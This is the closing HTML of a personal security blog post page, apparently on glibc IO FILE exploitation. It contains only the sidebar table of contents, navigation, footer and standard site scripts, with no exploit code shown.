    <a href="/2024/10/17/ret2dl-resolve/" rel="next" title="ret2dl-resolve">
      ret2dl-resolve <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#io-file"><span class="nav-number">1.</span> <span class="nav-text">IO FILE</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#datastructure"><span class="nav-number">1.1.</span> <span class="nav-text">datastructure</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#algorithm"><span class="nav-number">1.2.</span> <span class="nav-text">algorithm</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#fopen"><span class="nav-number">1.2.1.</span> <span class="nav-text">fopen</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fread"><span class="nav-number">1.2.2.</span> <span class="nav-text">fread</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%94%B3%E8%AF%B7%E7%BC%93%E5%86%B2%E5%8C%BA"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">申请缓冲区</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AF%BB%E5%8F%96%E6%95%B0%E6%8D%AE"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">读取数据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#underflow"><span class="nav-number">1.2.2.3.</span> <span class="nav-text">underflow</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#vtable%E4%BD%95%E6%97%B6%E5%8F%91%E6%8C%A5%E4%BD%9C%E7%94%A8"><span class="nav-number">1.2.2.4.</span> <span class="nav-text">vtable何时发挥作用?</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fwrite"><span class="nav-number">1.2.3.</span> <span class="nav-text">fwrite</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fclose"><span class="nav-number">1.2.4.</span> <span class="nav-text">fclose</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exploit"><span class="nav-number">1.3.</span> <span class="nav-text">exploit</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%84%E9%9C%B2"><span class="nav-number">1.3.1.</span> <span class="nav-text">泄露</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#fp-fopen.flag-w"><span class="nav-number">1.3.1.1.</span> <span class="nav-text">-1.fp &#x3D; fopen(&quot;.&#x2F;flag&quot;, &quot;w&quot;);</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#fp-_io_write_base-secret"><span class="nav-number">1.3.1.2.</span> <span class="nav-text">0.fp-&gt;_IO_write_base &#x3D; secret;</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#fp-_io_write_ptr-secret-sizeofsecret"><span class="nav-number">1.3.1.3.</span> <span class="nav-text">1.fp-&gt;_IO_write_ptr &#x3D; secret + sizeof(secret);</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#fp-_flags-0x800"><span class="nav-number">1.3.1.4.</span> <span class="nav-text">3.fp-&gt;_flags &#x3D; 0x800;</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#fp-_io_read_end-secret"><span class="nav-number">1.3.1.5.</span> <span class="nav-text">4.fp-&gt;_IO_read_end &#x3D; secret;</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#fsop%E6%96%B9%E6%B3%95"><span class="nav-number">1.3.1.6.</span> <span class="nav-text">FSOP方法</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99"><span class="nav-number">1.3.2.</span> <span class="nav-text">任意地址写</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#fp-fopen.flagr"><span class="nav-number">1.3.2.1.</span> <span class="nav-text">-1.fp &#x3D; fopen(&quot;.&#x2F;flag&quot;,&quot;r&quot;);</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#fp---_io_buf_base-key"><span class="nav-number">1.3.2.2.</span> <span class="nav-text">0.fp -&gt; _IO_buf_base &#x3D; &key;</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#fp---_io_buf_end-key-4"><span class="nav-number">1.3.2.3.</span> <span class="nav-text">1.fp -&gt; _IO_buf_end &#x3D; &amp;key + 4;</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#fp---_io_read_ptr-0-fp---_io_read_end-0"><span class="nav-number">1.3.2.4.</span> <span class="nav-text">2.fp -&gt; _IO_read_ptr &#x3D; 0; &amp;&amp; fp -&gt; _IO_read_end &#x3D; 0;</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#fp---_fileno-0"><span class="nav-number">1.3.2.5.</span> <span class="nav-text">3.fp -&gt; _fileno &#x3D; 0;</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#house-of-orange-glibc-2.23"><span class="nav-number">1.3.3.</span> <span class="nav-text">[house of orange @ glibc &lt;&#x3D;
2.23]</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#house-of-apple-glibc-2.23"><span class="nav-number">1.3.4.</span> <span class="nav-text">[house of apple @ glibc &gt;
2.23]</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fsop"><span class="nav-number">1.3.5.</span> <span class="nav-text">FSOP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn.college"><span class="nav-number">1.4.</span> <span class="nav-text">pwn.college</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#level1"><span class="nav-number">1.4.1.</span> <span class="nav-text">level1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level7"><span class="nav-number">1.4.2.</span> <span class="nav-text">level7</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level9"><span class="nav-number">1.4.3.</span> <span class="nav-text">level9</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level10"><span class="nav-number">1.4.4.</span> <span class="nav-text">level10</span></a></li></ol></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="dustball"
      src="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
  <p class="site-author-name" itemprop="name">dustball</p>
  <div class="site-description" itemprop="description">dustland</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">39</span>
        <span class="site-state-item-name">tags</span>
      </div>
  </nav>
</div>
  <div class="cc-license motion-element" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>



      </div>
        <div class="back-to-top motion-element">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">dustball</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
  </div>

        
<div class="busuanzi-count">
  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/pjax/pjax.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>

  <script>
var pjax = new Pjax({
  selectors: [
    'head title',
    '#page-configurations',
    '.content-wrap',
    '.post-toc-wrap',
    '.languages',
    '#pjax'
  ],
  switches: {
    '.post-toc-wrap': Pjax.switches.innerHTML
  },
  analytics: false,
  cacheBust: false,
  scrollTo : !CONFIG.bookmark.enable
});

window.addEventListener('pjax:success', () => {
  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
    var code = element.text || element.textContent || element.innerHTML || '';
    var parent = element.parentNode;
    parent.removeChild(element);
    var script = document.createElement('script');
    if (element.id) {
      script.id = element.id;
    }
    if (element.className) {
      script.className = element.className;
    }
    if (element.type) {
      script.type = element.type;
    }
    if (element.src) {
      script.src = element.src;
      // Force synchronous loading of peripheral JS.
      script.async = false;
    }
    if (element.dataset.pjax !== undefined) {
      script.dataset.pjax = '';
    }
    if (code !== '') {
      script.appendChild(document.createTextNode(code));
    }
    parent.appendChild(script);
  });
  NexT.boot.refresh();
  // Define Motion Sequence & Bootstrap Motion.
  if (CONFIG.motion.enable) {
    NexT.motion.integrator
      .init()
      .add(NexT.motion.middleWares.subMenu)
      .add(NexT.motion.middleWares.postList)
      .bootstrap();
  }
  NexT.utils.updateSidebarPosition();
});
</script>




  
  <script data-pjax>
    (function(){
      var canonicalURL, curProtocol;
      //Get the <link> tag
      var x=document.getElementsByTagName("link");
		//Find the last canonical URL
		if(x.length > 0){
			for (i=0;i<x.length;i++){
				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
					canonicalURL=x[i].href;
				}
			}
		}
    //Get protocol
	    if (!canonicalURL){
	    	curProtocol = window.location.protocol.split(':')[0];
	    }
	    else{
	    	curProtocol = canonicalURL.split(':')[0];
	    }
      //Get current URL if the canonical URL does not exist
	    if (!canonicalURL) canonicalURL = window.location.href;
	    //Assign script content. Replace current URL with the canonical URL
      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
  </script>




  
<script src="//cdn.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js"></script>
<script src="//cdn.jsdelivr.net/npm/instantsearch.js@4/dist/instantsearch.production.min.js"></script>
<script src="/js/algolia-search.js"></script>












<script data-pjax>
if (document.querySelectorAll('pre.mermaid').length) {
  NexT.utils.getScript('//cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js', () => {
    mermaid.initialize({
      theme    : 'dark',
      logLevel : 3,
      flowchart: { curve     : 'linear' },
      gantt    : { axisFormat: '%m/%d/%Y' },
      sequence : { actorMargin: 50 }
    });
  }, window.mermaid);
}
</script>


    <div id="pjax">
  

  
      

<script>
  if (typeof MathJax === 'undefined') {
    window.MathJax = {
      loader: {
          load: ['[tex]/mhchem'],
        source: {
          '[tex]/amsCd': '[tex]/amscd',
          '[tex]/AMScd': '[tex]/amscd'
        }
      },
      tex: {
        inlineMath: {'[+]': [['$', '$']]},
          packages: {'[+]': ['mhchem']},
        tags: 'ams'
      },
      options: {
        renderActions: {
          findScript: [10, doc => {
            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
              const display = !!node.type.match(/; *mode=display/);
              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
              const text = document.createTextNode('');
              node.parentNode.replaceChild(text, node);
              math.start = {node: text, delim: '', n: 0};
              math.end = {node: text, delim: '', n: 0};
              doc.math.push(math);
            });
          }, '', false],
          insertedScript: [200, () => {
            document.querySelectorAll('mjx-container').forEach(node => {
              let target = node.parentNode;
              if (target.nodeName.toLowerCase() === 'li') {
                target.parentNode.classList.add('has-jax');
              }
            });
          }, '', false]
        }
      }
    };
    (function () {
      var script = document.createElement('script');
      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
      script.defer = true;
      document.head.appendChild(script);
    })();
  } else {
    MathJax.startup.document.state(0);
    MathJax.texReset();
    MathJax.typeset();
  }
</script>

    

  

    </div>
</body>
</html>
